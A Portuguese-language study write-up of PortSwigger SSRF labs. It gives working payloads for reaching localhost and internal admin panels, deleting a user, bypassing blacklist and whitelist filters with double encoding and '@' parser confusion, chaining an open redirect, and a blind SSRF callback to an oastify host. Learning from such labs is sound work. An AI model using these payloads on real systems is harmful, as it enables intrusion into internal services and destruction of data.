Durante meus estudos em Web Security, aprofundei meus conhecimentos em Server-Side Request Forgery (SSRF) através dos labs da [PortSwigger Web Security Academy](https://portswigger.net/web-security?utm_source=chatgpt.com).

SSRF foi uma das vulnerabilidades mais interessantes que estudei até agora porque ela muda completamente a forma de pensar sobre aplicações web e infraestrutura interna.

Ao invés de focar apenas em:

* input/output
* frontend
* validações simples

SSRF obriga o atacante a entender:

* backend
* parsing de URL
* trust relationships
* rede interna
* filtros
* redirects
* encoding
* comportamento do servidor

Completei os labs envolvendo:

* SSRF básico
* SSRF contra localhost
* SSRF contra sistemas internos
* blacklist bypass
* whitelist bypass
* parser confusion
* open redirect chaining
* blind SSRF

---

# O que é SSRF?

SSRF (Server-Side Request Forgery) é uma vulnerabilidade onde o atacante consegue fazer o backend da aplicação realizar requisições HTTP para destinos inesperados.

Fluxo normal:

```text
Usuário -> Aplicação -> API legítima
```

Fluxo explorado:

```text
Usuário -> Aplicação -> localhost/rede interna/admin
```

---

# Funcionamento básico da vulnerabilidade

Aplicação vulnerável:

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net/product/stock/check?productId=1
```

Backend vulnerável:

```python
requests.get(stockApi)
```

O problema:

* o usuário controla a URL
* o backend faz a requisição
* o servidor confia no destino fornecido

---

# SSRF contra localhost

Primeiros labs resolvidos:

```http
stockApi=http://localhost/admin
```

e:

```http
stockApi=http://127.0.0.1/admin
```

Também utilizei:

```http
stockApi=http://127.1/admin
```

Porque:

```text
127.1 == 127.0.0.1
```

Resultado:

* acesso ao painel administrativo interno
* bypass de restrições de autenticação
* acesso privilegiado por requisição local

---

# Relações de confiança exploradas

Aprendi que muitas aplicações:

* confiam em localhost
* confiam em requests internas
* possuem painéis administrativos acessíveis apenas internamente

Exemplo:

* firewall protege acesso externo
* mas SSRF acessa internamente

Fluxo:

```text
Atacante -> Aplicação vulnerável -> localhost/admin
```

---

# SSRF contra sistemas internos

Também explorei SSRF em sistemas da rede privada.

Payload utilizado:

```http
stockApi=http://192.168.0.2:8080/admin
```

Objetivo:

* enumeração da rede interna
* descoberta de hosts ativos
* descoberta de painéis administrativos internos

Após localizar o host correto:

```http
stockApi=http://192.168.0.2:8080/admin/delete?username=carlos
```

Resultado:

* exclusão do usuário `carlos`
* exploração completa da funcionalidade administrativa

---

# URL Encoding

Durante os labs precisei aprender URL encoding para:

* bypass de filtros
* manipulação de parsing
* double encoding

Exemplo:

```text
http://localhost/admin
```

Codificado:

```text
http%3A%2F%2Flocalhost%2Fadmin
```

Principais caracteres:

| Codificado | Real |
| ---------- | ---- |
| `%3A`      | `:`  |
| `%2F`      | `/`  |
| `%3F`      | `?`  |
| `%26`      | `&`  |
| `%61`      | `a`  |

---

# SSRF com Blacklist-Based Filter

Nesse cenário:

* localhost bloqueado
* 127.0.0.1 bloqueado
* /admin bloqueado

Bypass realizado:

```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Explicação:

```text
%2561 -> %61 -> a
```

Resultado final:

```text
/admin
```

Técnicas utilizadas:

* double URL encoding
* IP alternative representation
* filtro bypass

---

# Parser Confusion

Essa parte foi uma das mais importantes para entender SSRF avançado.

Aprendi que:

* o filtro interpreta a URL de um jeito
* o backend interpreta de outro

Isso permite bypass usando:

* `@`
* `#`
* encoding
* fragments
* credentials

---

# SSRF com Whitelist-Based Filter

A aplicação aceitava apenas:

```text
stock.weliketoshop.net
```

Payload utilizado:

```http
stockApi=http://stock.weliketoshop.net@127.1/%2561dmin
```

O filtro enxergava:

```text
stock.weliketoshop.net
```

Mas o backend interpretava:

```text
127.1
```

Resultado:

* acesso interno liberado
* bypass completo da whitelist

---

# Double Encoding

Também utilizei double encoding para bypass de filtros.

Exemplo:

```text
%2561
```

Primeira decodificação:

```text
%61
```

Segunda decodificação:

```text
a
```

Resultado:

* bypass do bloqueio de `/admin`

---

# SSRF via Open Redirect

Um dos labs mais interessantes foi SSRF combinado com Open Redirect.

A aplicação validava apenas URLs pertencentes ao domínio permitido.

Porém existia um endpoint vulnerável:

```text
/product/nextProduct?path=
```

Payload utilizado:

```http
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Fluxo da exploração:

1. aplicação aceita endpoint legítimo
2. backend acessa `/product/nextProduct`
3. open redirect executa redirecionamento
4. backend segue redirect automaticamente
5. request chega ao host interno

Resultado:

* bypass completo da whitelist
* acesso ao painel interno
* exclusão do usuário `carlos`

---

# Blind SSRF

Também aprendi Blind SSRF.

Nesse cenário:

* backend faz request
* resposta não retorna ao atacante

Para detectar exploração utiliza-se:

* Burp Collaborator
* OAST
* DNS interaction
* HTTP callback

Payload exemplo:

```http
stockApi=http://attacker.oastify.com
```

Se o backend acessa:

* Collaborator registra interação DNS/HTTP

---

# Técnicas importantes aprendidas

## Alternative IP Representation

Bypass utilizando:

* 127.1
* 2130706433
* octal IPs

---

## URL Parsing Confusion

Diferença entre:

* filtro
* parser backend

---

## Double Encoding

Exploração usando:

* `%2561`
* múltiplas decodificações

---

## Vulnerability Chaining

Combinação de:

* SSRF
* Open Redirect
* URL Parsing
* Internal Network Access

---

# Ferramentas utilizadas

* [Burp Suite](https://portswigger.net/burp?utm_source=chatgpt.com)
* Repeater
* Burp Collaborator
* URL Encode/Decode
* HTTP Requests
* PortSwigger Labs

---

# Principais aprendizados

SSRF não é apenas:

```text
trocar uma URL
```

SSRF avançado envolve:

* entender infraestrutura
* entender backend
* entender parsing
* entender trust relationships
* explorar inconsistências

Aprendi a:

* identificar SSRF
* explorar localhost
* explorar rede interna
* bypassar filtros
* explorar parsing confusion
* utilizar redirects
* utilizar encoding
* detectar blind SSRF

---

# Conclusão

Os labs da [PortSwigger Web Security Academy](https://portswigger.net/web-security?utm_source=chatgpt.com) foram fundamentais para desenvolver entendimento prático sobre SSRF.

Completei laboratórios envolvendo:

* SSRF básico
* SSRF interno
* blacklist bypass
* whitelist bypass
* open redirect chaining
* parser confusion
* blind SSRF

Esses labs me ajudaram a evoluir:

* pensamento ofensivo
* análise de requests HTTP
* entendimento de backend
* exploração de vulnerabilidades reais

Hoje consigo identificar e explorar diferentes cenários SSRF utilizando Burp Suite, Repeater e análise detalhada do fluxo HTTP/backend.
